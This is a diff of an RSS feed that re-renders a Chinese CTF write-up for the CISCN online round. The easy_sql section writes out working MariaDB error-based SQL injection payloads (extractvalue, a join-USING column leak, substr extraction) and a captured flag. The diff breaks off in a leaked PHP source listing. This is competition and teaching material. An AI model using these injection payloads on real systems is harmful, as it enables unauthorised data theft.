@@ -8,142 +8,290 @@
         <language>zh-cn</language>
         <lastBuildDate>Wed, 18 Aug 2021 17:21:24 +0000</lastBuildDate><atom:link href="https://www.braindance.top/tags/php%E5%8E%9F%E7%94%9F%E7%B1%BB/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>CISCN线上赛库存</title>
-        <link>https://www.braindance.top/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link>
+        <link>https://www.braindance.top/articles/2021/08/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link>
         <pubDate>Wed, 18 Aug 2021 17:21:24 +0000</pubDate>
         
-        <guid>https://www.braindance.top/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid>
+        <guid>https://www.braindance.top/articles/2021/08/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid>
         <description>&lt;h1 id=&#34;easy_sql&#34;&gt;easy_sql
 &lt;/h1&gt;&lt;p&gt;在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是&lt;strong&gt;括号单引号闭合&lt;/strong&gt;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;lsquo;1&amp;rsquo;) LIMIT 0,1&amp;rsquo; at line 1&lt;/p&gt;&lt;/blockquote&gt;
 &lt;p&gt;过滤的字符有union，所以尝试报错注入，查询版本号。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来想要通过&lt;strong&gt;information_schema&lt;/strong&gt;库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;接下来想要通过&lt;strong&gt;information_schema&lt;/strong&gt;库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。&lt;/p&gt;
 &lt;p&gt;最后参考了网上的一篇文章：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_35867608/article/details/113937118&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;mysql 注入 information_schema_绕过IDS过滤information_schema继续注入&lt;/a&gt;，模仿文章构造payload&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;回显为：Duplicate column name &amp;rsquo;no&amp;rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;回显为：Duplicate column name &amp;rsquo;no&amp;rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}&lt;/p&gt;
 &lt;h1 id=&#34;easy_source&#34;&gt;easy_source
 &lt;/h1&gt;&lt;p&gt;使用目录扫描，扫描到了&lt;code&gt;.index.php.swo&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; $c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;d&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;h&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;k&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;m&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;o&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
